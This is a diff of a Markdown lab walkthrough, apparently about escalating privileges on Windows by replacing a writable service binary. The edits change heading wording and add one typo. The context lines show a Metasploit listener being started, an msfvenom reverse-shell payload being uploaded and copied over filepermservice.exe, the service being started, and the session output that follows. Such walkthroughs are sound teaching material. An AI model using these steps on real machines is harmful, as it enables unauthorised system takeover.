@@ -206,7 +206,7 @@ copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\temp
 
 ## Step 5 — Uploading the Payload and Replacing the Service Binary
 
-### Uploaded rev.exe from Kali
+### Upload rev.exe from Kali
 
 I had already created a payload named `rev.exe` using **msfvenom**. I uploaded it from my Kali machine to the victim using Meterpreter.
 
@@ -222,7 +222,7 @@ meterpreter > upload /home/kali/Desktop/rev.exe
   <img src="images/step5-1.png" width="600">
 </p>
 
-### Started Metasploit Listener on Kali
+### Start Metasploit Listener on Kali
 
 ```bash
 msfconsole -q
@@ -241,7 +241,7 @@ run
   <img src="images/step5-2.png" width="600">
 </p>
 
-### Replaced the Real Binary with My Payload
+### Replac the Real Binary with My Payload
 
 ```bash
 C:\PrivEsc> copy C:\PrivEsc\rev.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
@@ -258,7 +258,7 @@ The real filepermservice.exe was replaced with my rev.exe. Next time the service
   <img src="images/step5-3.png" width="600">
 </p>
 
-### Started the Service
+### Start the Service
 
 ```bash
 C:\PrivEsc> net start filepermsvc
@@ -271,7 +271,7 @@ C:\PrivEsc> net start filepermsvc
 [*] Sending stage (230982 bytes) to 192.168.5.129
 [*] Meterpreter session 1 opened (192.168.5.128:4444 → 192.168.5.144:49922) at 2026-01-19 12:16:34
 ```
-### Checked Privileges
+### Check Privileges
 
 ```bash
 C:\Windows\system32> whoami
